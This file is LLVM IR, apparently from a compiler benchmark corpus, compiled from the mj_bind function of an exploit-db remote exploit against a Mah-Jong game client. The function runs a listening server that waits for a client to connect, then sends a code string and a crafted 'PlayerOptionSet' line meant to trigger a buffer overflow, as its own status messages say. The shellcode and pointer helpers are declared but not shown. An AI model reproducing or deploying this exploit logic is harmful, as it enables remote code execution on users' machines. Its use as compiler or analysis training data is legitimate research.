; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_23115.c_mj_bind.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_23115.c_mj_bind.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { %struct.TYPE_2__, i32, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@SOL_SOCKET = common dso_local global i32 0, align 4
@SO_REUSEADDR = common dso_local global i32 0, align 4
@INADDR_ANY = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [37 x i8] c"[*] awaiting connection from: *:%d.\0A\00", align 1
@.str.1 = private unnamed_addr constant [23 x i8] c"could not bind socket.\00", align 1
@.str.2 = private unnamed_addr constant [45 x i8] c"[*] mah-jong server connection established.\0A\00", align 1
@.str.3 = private unnamed_addr constant [50 x i8] c"[*] sending the strings to exploit the overflow.\0A\00", align 1
@.str.4 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@.str.5 = private unnamed_addr constant [20 x i8] c"PlayerOptionSet %s\0A\00", align 1
@.str.6 = private unnamed_addr constant [40 x i8] c"[*] mah-jong server connection closed.\0A\00", align 1
@SO_REUSEPORT = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i8* @mj_bind(i16 zeroext %0, i32 %1) #0 {
  %3 = alloca i16, align 2
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  store i16 %0, i16* %3, align 2
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %6, align 4
  store i32 1, i32* %7, align 4
  store i32 0, i32* %8, align 4
  %11 = load i32, i32* @AF_INET, align 4
  %12 = load i32, i32* @SOCK_STREAM, align 4
  %13 = load i32, i32* @IPPROTO_TCP, align 4
  %14 = call i32 @socket(i32 %11, i32 %12, i32 %13)
  store i32 %14, i32* %5, align 4
  %15 = load i32, i32* %5, align 4
  %16 = load i32, i32* @SOL_SOCKET, align 4
  %17 = load i32, i32* @SO_REUSEADDR, align 4
  %18 = bitcast i32* %7 to i8*
  %19 = call i32 @setsockopt(i32 %15, i32 %16, i32 %17, i8* %18, i32 4)
  %20 = load i32, i32* @AF_INET, align 4
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  store i32 %20, i32* %21, align 4
  %22 = load i16, i16* %3, align 2
  %23 = call i32 @htons(i16 zeroext %22)
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i32 %23, i32* %24, align 4
  %25 = load i32, i32* @INADDR_ANY, align 4
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  %27 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %26, i32 0, i32 0
  store i32 %25, i32* %27, align 4
  %28 = load i16, i16* %3, align 2
  %29 = zext i16 %28 to i32
  %30 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str, i64 0, i64 0), i32 %29)
  %31 = load i32, i32* %5, align 4
  %32 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %33 = call i32 @bind(i32 %31, %struct.sockaddr* %32, i32 12)
  %34 = icmp eq i32 %33, -1
  br i1 %34, label %35, label %37

35:                                               ; preds = %2
  %36 = call i32 @printe(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.1, i64 0, i64 0), i32 1)
  br label %37

37:                                               ; preds = %35, %2
  %38 = load i32, i32* %5, align 4
  %39 = call i32 @listen(i32 %38, i32 1)
  %40 = bitcast %struct.sockaddr_in* %10 to i8*
  %41 = call i32 @bzero(i8* %40, i32 12)
  store i32 12, i32* %8, align 4
  %42 = load i32, i32* %5, align 4
  %43 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %44 = call i32 @accept(i32 %42, %struct.sockaddr* %43, i32* %8)
  store i32 %44, i32* %6, align 4
  %45 = load i32, i32* %5, align 4
  %46 = call i32 @close(i32 %45)
  %47 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.2, i64 0, i64 0))
  %48 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.3, i64 0, i64 0))
  %49 = load i32, i32* %6, align 4
  %50 = call i32 (...) @getcode()
  %51 = call i32 @mj_printf(i32 %49, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.4, i64 0, i64 0), i32 %50)
  %52 = load i32, i32* %6, align 4
  %53 = load i32, i32* %4, align 4
  %54 = call i32 @getptr(i32 %53)
  %55 = call i32 @mj_printf(i32 %52, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.5, i64 0, i64 0), i32 %54)
  %56 = call i32 @sleep(i32 1)
  %57 = load i32, i32* %6, align 4
  %58 = call i32 @close(i32 %57)
  %59 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.6, i64 0, i64 0))
  %60 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  %61 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %60, i32 0, i32 0
  %62 = load i32, i32* %61, align 4
  %63 = call i8* @inet_ntoa(i32 %62)
  ret i8* %63
}

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @setsockopt(i32, i32, i32, i8*, i32) #1

declare dso_local i32 @htons(i16 zeroext) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @bind(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @printe(i8*, i32) #1

declare dso_local i32 @listen(i32, i32) #1

declare dso_local i32 @bzero(i8*, i32) #1

declare dso_local i32 @accept(i32, %struct.sockaddr*, i32*) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @mj_printf(i32, i8*, i32) #1

declare dso_local i32 @getcode(...) #1

declare dso_local i32 @getptr(i32) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i8* @inet_ntoa(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
